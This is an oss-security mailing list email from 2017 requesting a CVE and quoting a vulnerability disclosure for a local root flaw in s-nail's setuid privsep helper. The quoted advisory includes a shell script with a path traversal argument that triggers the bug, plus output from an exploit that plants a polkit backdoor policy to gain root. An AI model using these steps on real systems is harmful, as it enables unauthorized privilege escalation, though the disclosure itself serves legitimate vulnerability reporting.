X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3373" "Sunday" "5" "February" "2017" "02:01:55" "+0100" "wapiflapi" "wapiflapi@yahoo.fr" "<c227f38a-f873-fbf8-b4bc-220df1b31066@yahoo.fr>" "110" "[oss-security] Re: CVE Request: s-nail local root" nil nil nil "2" "2017020501:01:55" "[oss-security] Re: CVE Request: s-nail local root" (number mark "U       wapiflapi@ya Feb  5  110/3373  " thread-indent "\"[oss-security] Re: CVE Request: s-nail local root\"\n") "<283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>" ("<283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22388 invoked by uid 550); 5 Feb 2017 07:59:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 23645 invoked from network); 5 Feb 2017 01:02:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.fr; s=s2048; t=1486256517; bh=V7hj9pDt1laFfMxWQj7x7d4T8RxXPeRgZa/k4lLGP2I=; h=Subject:To:References:Cc:From:Date:In-Reply-To:From:Subject; b=cKr3d37tjmHr8nm3V3/EPcplyiAwH/JBDcJJQlLZlqpOgCiCjkkj2Nk9tkQvsEbHUcJm+ZO4HjLryLQQzlUGtFHmkZgUT/9hO4LjLwEaeqhe9M0bhc0NOhM7DRW3klXCHyvIyT5KhF2F0pNkVJzKLgHn0kAcO4N+aecl935NySasRoEzRv/Iq7vlu5CnhmxOAQPhfKgsdSwvoe2dmemNLwquXXcieK407KNN0HdqedCzOqUukA6Ia3YTj2P9OhVitX+fyl1ucxSoiy1eKm5pomfXplleAT7gF0UD8cXr/T1QCwcuawbnm4FaB9ZJAgdruF1TT8VdEGEHc+jcTaf/xw==
X-Yahoo-Newman-Id: 97719.64156.bm@smtp108.mail.ir2.yahoo.com
X-Yahoo-Newman-Property: ymail-3
X-YMail-OSG: YFo4NtwVM1kgFagr3amg5yEWzmMf4GacyJ545vjiEaiDzra
 82h3VdSCyxMBFajKSuthCZHZtdNo7DS8Uiu5Z5hGP.nxUbs_4lyFcoc1Q6SC
 0aZZCom1Hmq61IBJoPHoUjEP38WRa6hbtIitLlSROpzQEjrO957H6o9iJ3Cg
 cn36Flqr1FUDSXUuXL81bxfzoOsjSJjc5akKptYm1HLrVRqak_gM14IwAesJ
 FmdmxVOzGYQW4GDWpvyeXA0uON25M9eUWzvmseltF.fIq3woUIgk89.Ql.Z4
 zc.hmoGgc4IKSgiqdy.N.C2TgE8yx232_wPquEAo61.B821uC1miTaCiW0NP
 TPG3_sGknaYjpSVPy3I5IklpB16_PWVh7WxcQHEVlHhg8AIfC6AYuJg.nu4M
 fC.wjEPerJ14lmABOZZllaaE67AkO3jNUYzyLSybRE7bq7oWNfIFe3fIfuIM
 RAT8qhnb0incDgW6Jr_7FFOJjVbtZZRvKH697xx7sUk0xj3Ivgb_.aIfd20m
 AdEuE1JfjuLUmQO_xhwgv5PjvqRqzzZpWYmMvjJGY5fwlNOJR4jgkBcr6LnU
 SZQ--
X-Yahoo-SMTP: U4ByNJCswBDrWOndmGo3cYknl59DpQ--
To: oss-security@lists.openwall.com
References: <283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>
Cc: Steffen Nurpmeso <steffen@sdaoden.eu>
From: wapiflapi <wapiflapi@yahoo.fr>
Message-ID: <c227f38a-f873-fbf8-b4bc-220df1b31066@yahoo.fr>
Date: Sun, 5 Feb 2017 02:01:55 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.7.0
MIME-Version: 1.0
In-Reply-To: <283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
Subject: [oss-security] Re: CVE Request: s-nail local root

Hi,

Still no update on this. If here is not the right place can someone
please point me to where I should ask for a CVE for this fixed local
root in s-nail?

Thanks!

On 01/27/2017 10:03 PM, wapiflapi wrote:
> Hi,
> 
> s-nail fixed a local root. This affects archlinux by default and other
> linux distros' packages (eg. ubuntu). Can we get a CVE for this ?
> 
> https://www.mail-archive.com/s-nail-users@lists.sourceforge.net/msg00551.html
> 
> Here is the advisory:
> 
> Affects
> =======
> 
> S-nail (later S-mailx) is a mail processing system. It is intended to
> provide the functionality of the POSIX mailx command. It is installed by
> default on archlinux and is pulled in on ubuntu whenever mailx is
> needed. It might be used elsewhere.
> 
> There is a vulnerability in the setuid root helper binary s-nail uses to
> handle lock files:
> 
>   - archlinux: /usr/lib/mail-privsep
>   - ubuntu:    /usr/lib/s-nail/s-nail/privsep
> 
> 
> Reproducing the issue
> =====================
> 
> The problem is that an O_EXCL file is created with a user controlled
> path because the di.di_hostname and di.di_randstr are never checked.
> This means that using s-nail-privsep a normal user can create a file
> anywhere on the filesystem, which is a security problem.
> 
> The command is very picky about it's arguments. Here is an example
> script setting up the bug. This runs the setuid binary under strace so
> we can see the call to open() that we control followed by a call to
> fchown() giving us ownership.
> 
> 
> ```
> # On archlinux it should be: /usr/lib/mail-privsep
> PRIVSEP=/usr/lib/s-nail/s-nail-privsep;
> 
> # Some setup to get the directory traversal working.
> touch /tmp/foo
> mkdir -p /tmp/foo.lock.spam.eggs
> 
> cd $(dirname $PRIVSEP);
> PATH=$PATH:. # argv[0] must be just the name.
> 
> # stdin & stdout must be pipes !
> echo | strace -f $(basename $PRIVSEP) rdotlock \
>               mailbox /tmp/foo name /tmp/foo.lock \
>               hostname spam randstr eggs/../../../../../../../tmp/test \
>               pollmsecs 0 |& grep -E "foo\.lock\.spam\.eggs|chown";
> ```
> 
> 
> Security Impact
> ===============
> 
> This issue can be leveraged by any logged in user to gain full root
> privileges.
> 
> To exploit this we have to win a race condition and find a way to
> leverage the ephemeral file. We achieve this by adding a polkit policy
> and using pkexec su.
> 
> A functional exploit is attached :-) Should look like this:
> 
> ```
> $ id
> uid=1000(wapiflapi) gid=1000(wapiflapi) groups=1000(wapiflapi)[...]
> $ ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
> [=] s-nail-privsep local root by @wapiflapi
> [+] Started flood in /usr/share/polkit-1/actions/backdoor.policy
> [+] Started race with /usr/lib/s-nail/s-nail-privsep
> [=] This could take a while...
> [/] wait for it: done
> root@box:~# id
> uid=0(root) gid=0(root) groups=0(root)
> ```
> 
> If the system doesn't have pkexec there are other ways to get root
> access from this. (`at` and `crontab` files come to mind.) The exploit
> is a bit slow (20s?), it's probably possible to be smarter about the
> race, but it's a poc ! ;-) Also if testing in a VM, having more than one
> cpu core helps a lot.
> 
> 
> Issue Timeline
> ==============
> 
> discovery:  26/01/2016
> disclosure: 27/01/2016
> vendor fix: 27/01/2016
> 
> 
> Regards,
> Wannes `wapiflapi` Rombouts
> 

